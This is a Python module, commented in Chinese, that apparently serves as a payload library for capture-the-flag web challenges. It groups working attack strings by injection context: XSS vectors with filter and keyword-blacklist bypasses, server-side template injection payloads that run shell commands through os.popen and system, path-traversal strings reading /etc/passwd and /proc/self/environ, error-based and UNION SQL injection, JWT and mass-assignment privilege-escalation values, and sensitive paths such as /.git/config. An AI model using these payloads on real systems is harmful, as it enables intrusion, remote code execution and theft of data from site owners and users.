"""载荷库。

组织方式：按"上下文"而不是按 CVE 分组 —— 实战里先判断注入点上下文，
再挑同上下文的候选集，逐个变体试，命中即停。
"""
from __future__ import annotations

# ---------- XSS / Dalgona 系列 ----------
# 上下文 1：反射在 HTML 文本里
XSS_TEXT = [
    "<script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "<svg/onload=alert(`XSS`)",
    "<body onload=alert(\"XSS\")>",
    "<img src=x onerror=alert(\"XSS\")>",
    "<z onfocus=alert('XSS') autofocus>",
    "<input autofocus onfocus=alert(\"XSS\")>",
]

# 上下文 2：反射在属性 value="..." 里
XSS_ATTR = [
    '"><svg onload=alert(\'XSS\')>',
    '" autofocus onfocus="alert(`XSS`)"',
    '" autofocus onfocus="alert(\'X\'+\'SS\')"',
    'x" onerror="alert&#40;\'XSS\'&#41;" a="',
    '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
]

# 上下文 3：反射进 <script> 字符串
XSS_JS = [
    '";alert(\'XSS\');//',
    '\\";alert(\'XSS\');//',
    '-alert(1)-',
]

# 上下文 4：反射进 iframe src / URL
XSS_URL = [
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=",
    "javascript:alert('XSS')",
]

# 上下文 5：服务端对 'alert' 做黑名单
XSS_ALIAS = [
    "<script>window['al'+'ert']('XSS')</script>",
    "<script>window[\"al\"+\"ert\"](\"XSS\")</script>",
    "<script>top['al'+'ert']('XSS')</script>",
    "<script>Function('ale'+'rt')('XSS')()</script>",
]

# 上下文 6：过滤 < 和 ( / 过滤字面量 XSS / 只允许字母数字（JSFuck）
XSS_ENTITY = [
    'x" onerror="alert&#40;\'XSS\'&#41;" a="',
    "<img src=x onerror=alert&#40;&#39;XSS&#39;&#41;>",
]
XSS_CHARCODE = [
    '"><img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '"><svg onload=eval(atob(\'YWxlcnQoJ1hTUycp\'))>',
]
# JSFuck 思路（不是固定串，需按禁用字符生成）：见 playbooks.jsfuck_alert()

# ---------- SSTI ----------
SSTI_PROBES = {
    "jinja": ["{{7*7}}", "{{7*'7'}}", "{{lipsum}}"],
    "twig": ["{{7*7}}", "{{7*'7'}}", "{{_self}}"],
    "django": ["{{7|add:7}}", "{% debug %}", "{{request.META}}"],
    "erb": ["<%= 7*7 %>", "<%= File.read('/etc/passwd') %>"],
    "freemarker": ["${7*7}"],
    "smarty": ["{7*7}"],
}

SSTI_RCE = {
    "jinja": [
        "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
        "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}",
    ],
    # 过滤了 _ { } % 时：用 attr + %c 拼字符串
    "jinja_filtered": [
        "{% set a='__' %}{{lipsum|attr(a+'globals'+a)}|attr('get')('os')|attr('popen')('cat /flag')|attr('read')()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag.txt')}}",
        "{{['cat /flag']|filter('system')}}",
    ],
    "django": [
        "{% debug %}",                       # 直接 dump context，常常就够了
        "{{messages.storages.0.signer.key}}",  # 无下划线访问
    ],
    "erb": ["<%= File.read('/app/flag.txt') %>", "<%= `cat /flag` %>"],
}

# ---------- LFI ----------
LFI_PATHS = [
    "../../../etc/passwd",
    "/etc/passwd",
    "....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "...././/...././/etc/passwd",   # 顺序 str_replace 绕过：'../' 与 './' 各命中一次后仍留 '../'
    "/proc/self/environ",
    "../../../var/log/apache2/access.log",
]
LFI_FLAG_TARGETS = ["/flag", "/FLAG.txt", "/flag.txt", "/app/flag.txt", "/tmp/flag", "/opt/flag.txt"]

# ---------- SQLi ----------
SQLI_PROBES = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "admin' OR '1'='1'-- -",
    "x' OR 1=1#",
    "1 AND 1=1",
    "1 AND 1=2",
]
SQLI_ERROR = [
    "' AND extractvalue(1,concat(0x7e,(select database())))-- -",
    "' AND updatexml(1,concat(0x7e,(select version())),1)-- -",
]
SQLI_UNION = [
    "' UNION SELECT 1,2,3,4,5,6,7-- -",
    "' UNION SELECT 1,2,3,4-- -",
]

# ---------- 认证/授权 ----------
JWT_FORGE_SUBS = ["1", "2", "0", "admin", "10001", "10019"]
B64_TOKEN_TRIES = ["MQ==", "Mg==", "Mw==", "MA==", "MTAwMDE="]   # base64("1","2","3","0","10001")

MASS_ASSIGN_FIELDS = [
    ("is_admin", "1"), ("isAdmin", "true"), ("admin", "1"),
    ("role", "admin"), ("role", "1"), ("user_id", "1"),
    ("username", "admin"), ("is_superuser", "true"),
]

# ---------- 反序列化 ----------
PHP_MAGIC_HASHES = ["240610708", "QNKCDZO", "aabg7XSs", "aabC9RqS"]   # md5 == 0e...

# ---------- 通用 ----------
INTERESTING_PATHS = [
    "/openapi.json", "/docs", "/robots.txt", "/.git/config", "/static/",
    "/flag", "/FLAG.txt", "/flag.txt", "/admin", "/admin.php", "/api",
    "/source", "/debug", "/console", "/actuator", "/server-status", "/wp-json/",
]
